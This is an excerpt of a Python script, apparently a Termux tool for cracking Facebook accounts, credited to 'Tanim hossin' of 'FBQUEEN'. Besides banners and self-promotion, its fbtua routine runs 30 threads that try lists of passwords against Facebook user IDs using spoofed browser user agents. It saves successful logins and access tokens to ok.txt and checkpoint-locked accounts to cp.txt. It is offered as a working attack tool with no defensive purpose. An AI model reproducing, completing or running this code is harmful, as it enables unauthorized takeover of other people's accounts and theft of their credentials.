...
def logo():
	print ("""                                         
EEEEEEEEEEEEEEEEEEEEEEHHHHHHHHH     HHHHHHHHH
E::::::::::::::::::::EH:::::::H     H:::::::H
E::::::::::::::::::::EH:::::::H     H:::::::H
EE::::::EEEEEEEEE::::EHH::::::H     H::::::HH
  E:::::E       EEEEEE  H:::::H     H:::::H  
  E:::::E               H:::::H     H:::::H  
  E::::::EEEEEEEEEE     H::::::HHHHH::::::H  
  E:::::::::::::::E     H:::::::::::::::::H  
  E:::::::::::::::E     H:::::::::::::::::H  
  E::::::EEEEEEEEEE     H::::::HHHHH::::::H  
  E:::::E               H:::::H     H:::::H  
  E:::::E       EEEEEE  H:::::H     H:::::H  
EE::::::EEEEEEEE:::::EHH::::::H     H::::::HH
E::::::::::::::::::::EH:::::::H     H:::::::H
E::::::::::::::::::::EH:::::::H     H:::::::H
EEEEEEEEEEEEEEEEEEEEEEHHHHHHHHH     HHHHHHHHH
 ───────────────────────────────────────────────────────×
  ───────────────────────────────────────────────────────×
\t\033[1;97m[\x1b[1;97m\x1b[1;41m EH Tanim \x1b[0m\x1b[1;97m]
...
EEEEEEEEEEEEEEEEEEEEEEHHHHHHHHH     HHHHHHHHH                                                                 
 ───────────────────────────────────────────────────────×
\t\033[1;97m[\x1b[1;97m\x1b[1;41m EHTanim\x1b[0m\x1b[1;97m]
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Version :1\x1b[0m\x1b[1;97m] \033[1;37m 
 ───────────────────────────────────────────────────────×
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Author   : Tanim hossin \x1b[0m\x1b[1;97m]
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Github   : FBQUEEN \x1b[0m\x1b[1;97m]
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Facebook : EH Tanim \x1b[0m\x1b[1;97m]
───────────────────────────────────────────────────────× 
 """)
...
def helpnote():
	...
	subprocess.check_output(["am", "start", "https://github.com/FB-QUEEN/approved-"])
	#yahan apni facebook id link dalna
	exit(" [=>] FACEBOOK :  https://www.facebook.com/cyber.king.tanim")
...
class Main:
	def __init__(self):
		...
		try:
			...
			plr = requests.get('https://github.com/FB-QUEEN/approved-').text
			if basesplit in plr:
				key = basesplit
...
───────────────────────────────────────────────────────× 
    """)
		...
		print("───────────────────────────────────────────────────────× ")
		print(" \t\033[1;97m[\x1b[1;97m\x1b[1;41m FOLLOW MY FACEBOOK ID \x1b[0m\x1b[1;97m] \033[1;37m ")
		subprocess.check_output(["am", "start", "https://www.facebook.com/cyber.king.tanim"])
		print("───────────────────────────────────────────────────────× ")
	...
	def fbtua(self):
		...
		try:
			...
			with ThreadPoolExecutor(max_workers=30) as coeg:
				...
				print("\033[0;92m[=×>]\033[0;92m NOTE : 10 min por  flying mood on 10 second  ")
				print("\033[0;97m───────────────────────────────────────────────────────× ")
				for user in self.id:
  ...
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0'
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r  \033[0;97m   [=Tanim=OK=>] %s | %s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write("   [=Tanim=OK=>]  %s|%s\n"%(uid, pw))
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r  \033[0;92m   [=Tanim=CP=>] %s | %s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write("   [=Tanim=CP=>]  %s|%s\n"%(uid, pw))
				break
			else:
				continue
...
if len(sys.argv) == 2:
	if sys.argv[1] == "--info":
		...
		print("\n [*] Author    : Tanim hossin  ")
		print(" [*] Team      : FBQUEEN \n")
		print(" [ Sosial Medi  ] FACEBOOK  \n")
		print(" [*] Facebook  : EH Tanim ")
		print(" [*] YouTube   : Tanim official ")
		exit(" [*] GitHub    : FBQUEEN ")
	else:
		Main()
